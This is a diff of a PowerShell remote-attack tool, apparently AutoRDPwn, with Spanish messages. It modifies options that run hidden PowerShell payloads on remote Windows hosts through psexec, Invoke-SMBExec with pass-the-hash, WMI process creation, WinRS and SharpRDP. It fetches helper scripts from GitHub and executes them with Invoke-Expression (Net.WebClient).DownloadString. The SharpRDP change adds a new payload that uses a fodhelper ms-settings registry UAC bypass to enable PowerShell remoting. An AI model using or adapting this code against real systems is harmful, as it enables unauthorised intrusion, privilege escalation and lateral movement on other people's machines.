@@ -224,14 +224,14 @@ function Remove-Exclusions {
         if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-PSexec.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')}
-        if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
-        if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
+        if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn1" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn2" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn3" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn4" -nobanner -accepteula }
+        if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn1" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn2" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn3" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn4" -nobanner -accepteula }
         del .\psexec.exe 2>&1> $null }
 
         '2' {
@@ -250,11 +250,11 @@ function Remove-Exclusions {
         if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SMBExec.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')}
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn1" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn2" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn3" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn4" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -noprofile -windowstyle hidden $Pwn5" }
 
         '3' {
         if($option) { $computer='localhost' } else {
@@ -277,7 +277,7 @@ function Remove-Exclusions {
         try { $cimargs = @{ ComputerName = $computer ; SessionOption = (New-CimSessionOption -Protocol Dcom) ; ErrorAction = 'Stop' } ; if($user){ $cimargs['Credential'] = $credential }
         $CimSes = New-CimSession @cimargs } catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
         foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$CimSes){ throw }
-        $result = Invoke-CimMethod -CimSession $CimSes -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -windowstyle hidden $pwn" } -ErrorAction Stop
+        $result = Invoke-CimMethod -CimSession $CimSes -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -noprofile -windowstyle hidden $pwn" } -ErrorAction Stop
         if($result.ReturnValue -eq 0){ Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }
         catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } ; Write-Host }
         if($CimSes){ Remove-CimSession $CimSes 2>&1> $null }}
@@ -325,7 +325,7 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         if(!(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 5985 (WinRM) esta cerrado en ${computer}.. WinRS necesita WinRM ya activo en el destino: lanza antes el ataque 3 (WMI) o 1 (SMB)" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host "[i] ${computer}: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
-        $winrsout = & winrs.exe -r:$computer -u:$user -p:$PlainTextPassword -noecho -noprofile -allowdelegate "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1
+        $winrsout = & winrs.exe -r:$computer -u:$user -p:$PlainTextPassword -noecho -noprofile -allowdelegate "powershell.exe -noprofile -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1
         if($LASTEXITCODE -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] WinRS fallo en ${computer} (codigo $LASTEXITCODE): $winrsout" -ForegroundColor Red ; Write-Host "[i] Si es error de autenticacion, revisa la clave y el formato de usuario (DOMINIO\usuario o .\usuario para cuentas locales)" -ForegroundColor DarkGray ; Start-Sleep -milliseconds 2000 }}
 
         '6' {
@@ -357,8 +357,8 @@ function Remove-Exclusions {
         if(!(Test-RemoteTcp -Computer $computer -Port 3389 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 3389 (RDP) esta cerrado en ${computer}.. SharpRDP necesita el escritorio remoto activo" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
-        Write-Host "[i] ${computer}: lanzando los payloads en 1 sola sesion RDP (SharpRDP, limite 45s).." -ForegroundColor DarkGray
-        $srcommand = "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4"
+        Write-Host "[i] ${computer}: lanzando payload en 1 sola sesion RDP (SharpRDP + auto-elevacion UAC, limite 45s).." -ForegroundColor DarkGray
+        $srcommand = "powershell -nop -w h -c `$e='Get-NetConnectionProfile|Set-NetConnectionProfile -NetworkCategory Private;Enable-PSRemoting -Force -SkipNetworkProfileCheck';whoami /groups >> `$env:TEMP\AutoRDPwn-payload.log;`$k='HKCU\Software\Classes\ms-settings\Shell\Open\command';if((whoami /groups) -match 'S-1-16-12288'){iex `$e}else{reg add `$k /v DelegateExecute /f;reg add `$k /d ('powershell -nop -w h -c '+`$e) /f;fodhelper}"
         $srargs = 'computername=' + $computer + ' command="' + $srcommand + '"'
         if($user){ $srargs = 'computername=' + $computer + ' username="' + $user + '" password="' + $PlainTextPassword + '" command="' + $srcommand + '"' }
         $srpsi = New-Object System.Diagnostics.ProcessStartInfo ; $srpsi.FileName = '.\SharpRDP.exe' ; $srpsi.Arguments = $srargs ; $srpsi.UseShellExecute = $false
@@ -367,6 +367,7 @@ function Remove-Exclusions {
         elseif($srproc.ExitCode -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green }
         else { Write-Host "[!] SharpRDP termino con codigo $($srproc.ExitCode)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } }
         catch { Write-Host "[!] No se pudo lanzar SharpRDP: $($_.Exception.Message)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
+        Write-Host "[i] Si WinRM sigue apagado: en la maquina destino revisa RunMRU (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU) y %TEMP%\AutoRDPwn-payload.log -- ahi se ve el texto exacto que llego al dialogo Ejecutar" -ForegroundColor DarkGray
         del .\SharpRDP.exe 2>&1> $null }
         
         'M' { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $mem_computer" -ForegroundColor DarkGray }
@@ -761,7 +762,7 @@ else { Write-Host "[!] WinRM (5985) sin respuesta en $computer.. el modo espejo 
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host "[+] $txt66" ; Write-Host ; Write-Host "[i] Credenciales primero: cmdkey /add:$remotehost /user:USUARIO /pass:CLAVE" ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /f" ; Write-Host
-if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
+if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -noprofile -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host "[i] $txt38" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
